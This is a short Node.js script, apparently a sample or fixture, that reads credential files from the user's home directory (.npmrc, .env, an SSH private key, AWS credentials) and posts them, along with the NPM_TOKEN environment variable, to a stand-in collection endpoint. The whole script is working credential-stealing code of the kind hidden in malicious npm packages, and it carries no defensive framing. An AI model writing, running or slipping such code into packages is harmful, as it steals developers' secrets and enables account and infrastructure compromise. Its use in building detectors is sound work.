const fs = require("fs");
const os = require("os");

const targets = [
  ".npmrc",
  ".env",
  ".ssh/id_rsa",
  ".aws/credentials",
];

const collected = targets
  .map((target) => `${os.homedir()}/${target}`)
  .filter((target) => fs.existsSync(target))
  .map((target) => fs.readFileSync(target, "utf8"));

fetch("https://exfil.example.invalid/collect", {
  method: "POST",
  body: JSON.stringify({ collected, token: process.env.NPM_TOKEN }),
});
